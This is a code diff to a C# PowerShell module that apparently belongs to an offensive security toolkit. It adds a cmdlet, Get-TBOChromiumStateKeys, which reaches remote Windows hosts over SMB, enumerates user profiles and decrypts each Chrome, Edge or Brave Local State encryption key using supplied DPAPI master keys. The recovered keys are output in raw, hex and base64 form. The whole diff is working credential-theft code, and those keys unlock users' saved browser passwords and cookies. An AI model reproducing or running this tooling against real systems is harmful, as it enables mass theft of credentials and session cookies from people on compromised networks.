@@ -704,7 +704,9 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 	internal sealed class ChromeStateKeyCache
 	{
-		private readonly Dictionary<string, (byte[]? Key, string? FailureReason)> _cache = new(StringComparer.OrdinalIgnoreCase);
+		private readonly Dictionary<string, CacheEntry> _cache = new(StringComparer.OrdinalIgnoreCase);
+
+		private readonly record struct CacheEntry(byte[]? Key, string? FailureReason, string? MasterKeyGuid, bool HmacValidated);
 
 		internal bool TryGetOrDecrypt(
 			ISmbProviderInfo smb,
@@ -715,14 +717,41 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			out byte[]? stateKey,
 			out string? failureReason)
 		{
+			return TryGetOrDecryptDetailed(
+				smb,
+				localStatePath,
+				masterKeySet,
+				cancellationToken,
+				logVerbose,
+				out stateKey,
+				out _,
+				out _,
+				out failureReason);
+		}
+
+		internal bool TryGetOrDecryptDetailed(
+			ISmbProviderInfo smb,
+			UncPath localStatePath,
+			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
+			CancellationToken cancellationToken,
+			Action<string>? logVerbose,
+			out byte[]? stateKey,
+			out string? masterKeyGuid,
+			out bool hmacValidated,
+			out string? failureReason)
+		{
 			logVerbose ??= _ => { };
 			failureReason = null;
+			masterKeyGuid = null;
+			hmacValidated = false;
 
 			var cacheKey = localStatePath.ToString();
 			if (_cache.TryGetValue(cacheKey, out var cached))
 			{
 				stateKey = cached.Key;
 				failureReason = cached.FailureReason;
+				masterKeyGuid = cached.MasterKeyGuid;
+				hmacValidated = cached.HmacValidated;
 				return stateKey != null && stateKey.Length > 0;
 			}
 
@@ -733,21 +762,21 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				if (!TryParseEncryptedStateKey(localStateBytes, out var encryptedKeyBytes, out var parseFailure))
 				{
 					failureReason = parseFailure;
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
 				if (!ChromeHelpers.TryStripDpapiHeader(encryptedKeyBytes, out var dpapiBlobBytes, out var stripFailure))
 				{
 					failureReason = $"Local State encrypted_key decode failed: {stripFailure}";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
-				if (!ChromeCrypto.TryDecryptDpapi(dpapiBlobBytes, masterKeySet, logVerbose, out var cleartext, out _, out _, out var dpapiFailure))
+				if (!ChromeCrypto.TryDecryptDpapi(dpapiBlobBytes, masterKeySet, logVerbose, out var cleartext, out masterKeyGuid, out hmacValidated, out var dpapiFailure))
 				{
 					failureReason = $"Local State encrypted_key DPAPI decrypt failed: {dpapiFailure}";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
@@ -756,24 +785,24 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					failureReason = cleartext == null
 						? "Local State encrypted_key DPAPI cleartext was empty."
 						: $"Local State encrypted_key decrypted length was {cleartext.Length}, expected 32.";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
 				stateKey = cleartext;
-				_cache[cacheKey] = (stateKey, null);
+				_cache[cacheKey] = new CacheEntry(stateKey, null, masterKeyGuid, hmacValidated);
 				return true;
 			}
 			catch (Winterop.NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
 			{
 				failureReason = $"Local State not found: {ex.StatusCode}.";
-				_cache[cacheKey] = (null, failureReason);
+				_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 				return false;
 			}
 			catch (Exception ex)
 			{
 				failureReason = ex.Message;
-				_cache[cacheKey] = (null, failureReason);
+				_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 				return false;
 			}
 		}
@@ -1024,6 +1053,20 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string? ValueHex { get; init; }
 		public byte[]? ValueBytes { get; init; }
 		public string? EncryptionType { get; init; }
+		public string? MasterKeyGuid { get; init; }
+		public bool HmacValidated { get; init; }
+		public string? FailureReason { get; init; }
+	}
+
+	public sealed class TboChromiumStateKeyInfo
+	{
+		public string ServerName { get; init; } = string.Empty;
+		public string Browser { get; init; } = string.Empty;
+		public string? UserName { get; init; }
+		public string SourcePath { get; init; } = string.Empty;
+		public byte[]? StateKeyBytes { get; init; }
+		public string? StateKeyHex { get; init; }
+		public string? StateKeyBase64 { get; init; }
 		public string? MasterKeyGuid { get; init; }
 		public bool HmacValidated { get; init; }
 		public string? FailureReason { get; init; }
@@ -1517,6 +1560,103 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					FailureReason = failureReason
 				});
 			}
+		}
+	}
+
+	[Cmdlet(VerbsCommon.Get, "TBOChromiumStateKeys")]
+	[OutputType(typeof(TboChromiumStateKeyInfo))]
+	public sealed class GetTBOChromiumStateKeys : SmbCmdlet
+	{
+		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
+		public string ServerName { get; set; } = string.Empty;
+
+		[Parameter]
+		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
+
+		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
+		public string[]? UserName { get; set; }
+
+		[Parameter(Mandatory = true)]
+		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }
+
+		private CancellationTokenSource? _cancelSource;
+
+		protected override void ProcessRecord(ISmbProviderInfo smb)
+		{
+			this._cancelSource ??= new CancellationTokenSource();
+			var cancellationToken = this._cancelSource.Token;
+
+			var serverName = ChromeHelpers.NormalizeServerName(this.ServerName);
+			if (string.IsNullOrWhiteSpace(serverName))
+				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));
+
+			var shareName = ChromeHelpers.NormalizeShareName(this.ShareName);
+			if (string.IsNullOrWhiteSpace(shareName))
+				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
+
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
+			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromiumStateKeys");
+			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
+			var users = ChromeHelpers.EnumerateUserDirectories(
+				smb,
+				serverName,
+				shareName,
+				userFilters,
+				logWarning: msg => this.LogWarning(smb, msg),
+				logVerbose: msg => this.LogVerbose(smb, msg),
+				logException: (context, ex) => this.LogException(smb, context, ex),
+				cancellationToken);
+
+			var stateKeys = new ChromeStateKeyCache();
+			foreach (var user in users)
+			{
+				cancellationToken.ThrowIfCancellationRequested();
+
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
+				stateKeys.TryGetOrDecryptDetailed(
+					smb,
+					localStatePath,
+					masterKeySet,
+					cancellationToken,
+					logVerbose: msg => this.LogVerbose(smb, msg),
+					out var stateKey,
+					out var masterKeyGuid,
+					out var hmacValidated,
+					out var failureReason);
+
+				string? stateKeyHex = null;
+				string? stateKeyBase64 = null;
+				if (stateKey != null && stateKey.Length > 0)
+				{
+					stateKeyHex = stateKey.ToHexString();
+					stateKeyBase64 = Convert.ToBase64String(stateKey);
+				}
+
+				this.WriteObject(new TboChromiumStateKeyInfo
+				{
+					ServerName = serverName,
+					Browser = browser,
+					UserName = user,
+					SourcePath = localStatePath.ToString(),
+					StateKeyBytes = stateKey,
+					StateKeyHex = stateKeyHex,
+					StateKeyBase64 = stateKeyBase64,
+					MasterKeyGuid = masterKeyGuid,
+					HmacValidated = hmacValidated,
+					FailureReason = failureReason
+				});
+			}
+		}
+
+		protected override void StopProcessing()
+		{
+			this._cancelSource?.Cancel();
+			base.StopProcessing();
 		}
 	}
 }
